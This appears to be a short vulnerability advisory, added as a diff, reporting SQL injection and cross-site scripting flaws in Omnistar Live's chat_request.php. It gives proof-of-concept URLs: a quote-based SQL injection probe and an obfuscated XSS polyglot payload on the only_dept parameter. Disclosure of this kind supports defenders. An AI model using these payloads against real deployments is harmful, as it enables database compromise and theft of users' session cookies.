@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/52438/info
+
+Omnistar Live is prone to an SQL-injection vulnerability and a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+SQL:
+
+http://www.example.com/support2/chat_request.php?only_dept=1%27
+
+http://www.example.com/support/chat_request.php?only_dept=1%27
+
+XSS:
+
+http://www.example.com/support2/chat_request.php?only_dept=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
